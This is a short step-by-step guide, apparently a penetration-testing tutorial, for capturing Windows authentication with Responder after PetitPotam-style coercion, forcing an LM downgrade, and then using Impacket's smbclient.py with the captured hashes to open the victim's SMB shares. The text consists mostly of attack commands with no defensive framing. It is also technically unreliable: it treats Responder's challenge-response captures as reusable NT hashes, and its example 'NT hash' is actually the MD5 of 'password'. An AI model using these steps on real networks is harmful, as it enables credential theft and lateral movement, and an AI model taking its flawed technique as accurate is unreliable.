### Step 1: Set Up Responder to Capture Authentication Requests

Responder is a tool commonly used to capture and relay authentication requests on a network. By listening on the network, you can catch coerced authentication attempts from machines exploited by attacks like PetitPotam.

- **Command:**
  ```bash
  responder -I eth0 --lm
  ```

  - `-I eth0`: Specifies the network interface to listen on (replace `eth0` with your interface).
  - `--lm`: Forces an LM (LAN Manager) downgrade, increasing the chances of capturing weaker NTLM hashes.

### Step 2: Using `smbclient.py` to Connect to Captured Shares

Once Responder captures credentials or coerces machines to authenticate to your server, you can use `smbclient.py` from Impacket to connect to the shares exposed by the coerced machine.

- **Command:**
  ```bash
  smbclient.py <domain>/<user> -hashes <lmhash>:<nthash> <ip_address>
  ```

  - `<domain>/<user>`: Specify the domain and user account.
  - `<lmhash>:<nthash>`: Use the captured hashes from Responder. If you only have the NT hash, use `:<nthash>`.
  - `<ip_address>`: The IP address of the target machine.

  **Example:**
  ```bash
  smbclient.py WORKGROUP/admin -hashes :5f4dcc3b5aa765d61d8327deb882cf99 192.168.1.10
  ```

### Summary

By setting up Responder on your network interface, you can capture authentication requests from coerced machines and then use `smbclient.py` to connect to the exposed shares using the captured hashes. 